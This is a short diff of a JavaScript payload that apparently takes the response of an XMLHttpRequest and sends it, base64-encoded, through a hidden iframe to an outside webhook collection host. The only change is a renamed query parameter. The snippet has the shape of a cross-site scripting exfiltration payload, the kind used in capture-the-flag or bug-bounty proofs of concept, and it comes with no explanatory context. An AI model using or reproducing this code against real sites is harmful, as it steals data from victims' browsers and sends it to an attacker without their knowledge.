@@ -4,7 +4,7 @@ function reqListener () {
     var raw = this.responseText;
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
-	iframe.src = "https://762202e9.proxy.webhookapp.com/?gg="+b64;
+	iframe.src = "https://762202e9.proxy.webhookapp.com/?ff="+b64;
 	document.body.appendChild(iframe);
 } 
 var oReq = new XMLHttpRequest(); 
